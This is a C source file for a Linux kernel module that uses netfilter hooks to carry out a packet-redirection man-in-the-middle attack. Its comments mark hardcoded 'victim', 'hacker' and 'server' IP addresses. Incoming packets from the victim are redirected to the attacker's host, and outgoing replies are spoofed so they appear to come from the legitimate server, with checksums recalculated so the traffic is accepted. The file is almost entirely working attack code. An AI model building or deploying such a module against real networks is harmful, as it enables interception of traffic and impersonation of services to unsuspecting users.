//https://www.kernel.org/
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/skbuff.h>
#include <linux/tcp.h>
#include <linux/proc_fs.h>
#include <linux/list.h>
#include <linux/icmp.h>
#include <linux/netdevice.h>
#include <linux/time.h>
#include <linux/init.h>
#include <linux/netfilter.h>
#include <linux/module.h>
#include <linux/skbuff.h>
#include <linux/netdevice.h>
#include <linux/netfilter_ipv4.h>
#include <linux/net.h>
#include <net/ip.h>
#include <linux/if_ether.h>
#include <net/protocol.h>
#include <net/icmp.h>
#include <net/tcp.h>
#include <linux/if_vlan.h>

#define NIPQUAD(addr) \
    ((unchar *)&addr)[0], \
    ((unchar *)&addr)[1], \
    ((unchar *)&addr)[2], \
    ((unchar *)&addr)[3]

unchar tar_ip[4] = {192,168,235,143};       //victim ip
unchar me_ip[4] = {192,168,235,145};        //hacker ip
unchar server_ip[4] = {192,168,235,142};    //server ip

int isTarIp(__be32 sip){
    if(tar_ip[0] == ((unchar *)&sip)[0] &&
            tar_ip[1] == ((unchar *)&sip)[1] &&
            tar_ip[2] == ((unchar *)&sip)[2] &&
            tar_ip[3] == ((unchar *)&sip)[3] ){
        return 1;
    }
    return 0;
}

__be32 ipToLong(unchar* ip) {
    return ((ip[3]) << 24) + ((ip[2]) << 16) + ((ip[1]) << 8) + (ip[0]);
}

uint sample(uint hooknum,struct sk_buff * skb,const struct net_device *in,const struct net_device *out,int (*okfn) (struct sk_buff *)){
    struct iphdr *ip_header = (struct iphdr *)skb_network_header(skb);
    struct tcphdr *tcp_header;
    __be32 sip,dip;
    sip = ip_header->saddr;
    dip = ip_header->daddr;
    unsigned int src_port = 0;
    unsigned int dest_port = 0;

    tcp_header = (struct tcphdr *)skb_transport_header(skb);
    src_port = (unsigned int)ntohs(tcp_header->source);
    dest_port = (unsigned int)ntohs(tcp_header->dest);
    if(isTarIp(sip)){
        ip_header->daddr = ipToLong(me_ip);  //change the destination ip to the hack ip so the kernel would process the packet
        __be32 rdip = ip_header->daddr;

        unsigned int tcp_len = skb->len - (ip_header->ihl<<2);
        tcp_header->check=0;
        tcp_header->check = csum_tcpudp_magic(ip_header->saddr, ip_header->daddr,
                                      tcp_len, ip_header->protocol,
                                      csum_partial((char *)tcp_header, tcp_len, 0));    //recalculate the TCP checksum
        ip_header->check=0;
        ip_header->check=ip_fast_csum((unsigned char*)ip_header, ip_header->ihl);       //recalculate the IP checksum

        printk(KERN_CRIT "%d.%d.%d.%d:%d ---> %d.%d.%d.%d:%d\n",NIPQUAD(sip),src_port,NIPQUAD(rdip),dest_port);
    }

    return NF_ACCEPT;
}

struct nf_hook_ops sample_ops = {
    .hook = (void*)sample,
    .pf = PF_INET,
    .hooknum = NF_INET_PRE_ROUTING,
    .priority = NF_IP_PRI_FILTER,
};

//-----------------------------------

uint sample_out(uint hooknum,struct sk_buff * skb,const struct net_device *in,const struct net_device *out,int (*okfn) (struct sk_buff *)){
    struct iphdr *ip_header = (struct iphdr *)skb_network_header(skb);
    struct tcphdr *tcp_header;
    __be32 sip,dip;
    sip = ip_header->saddr;
    dip = ip_header->daddr;
    unsigned int src_port = 0;
    unsigned int dest_port = 0;

    tcp_header = (struct tcphdr *)skb_transport_header(skb);
    src_port = (unsigned int)ntohs(tcp_header->source);
    dest_port = (unsigned int)ntohs(tcp_header->dest);
    if(isTarIp(dip)){
        ip_header->saddr = ipToLong(server_ip);         //change the source ip to the server ip so the victim would process the packet
        __be32 rsip = ip_header->saddr;

        unsigned int tcp_len = skb->len - (ip_header->ihl<<2);
        tcp_header->check=0;
        tcp_header->check = csum_tcpudp_magic(ip_header->saddr, ip_header->daddr,
                                      tcp_len, ip_header->protocol,
                                      csum_partial((char *)tcp_header, tcp_len, 0));    //recalculate the TCP checksum
        ip_header->check=0;
        ip_header->check=ip_fast_csum((unsigned char*)ip_header, ip_header->ihl);       //recalculate the IP checksum

        printk(KERN_CRIT "%d.%d.%d.%d:%d <--- %d.%d.%d.%d:%d==>cs: %x\n",NIPQUAD(dip),dest_port,NIPQUAD(rsip),src_port,tcp_header->check);
    }

    return NF_ACCEPT;
}

struct nf_hook_ops sample_ops_out = {
    .hook = (void*)sample_out,
    .pf = PF_INET,
    .hooknum = NF_INET_POST_ROUTING,
    .priority = NF_IP_PRI_FILTER,
};

int sample_init(void) {
    nf_register_net_hook(&init_net,&sample_ops);
    nf_register_net_hook(&init_net,&sample_ops_out);
    return 0;
}

void sample_exit(void) {
    nf_unregister_net_hook(&init_net,&sample_ops);
    nf_unregister_net_hook(&init_net,&sample_ops_out);
}

module_init(sample_init);
module_exit(sample_exit);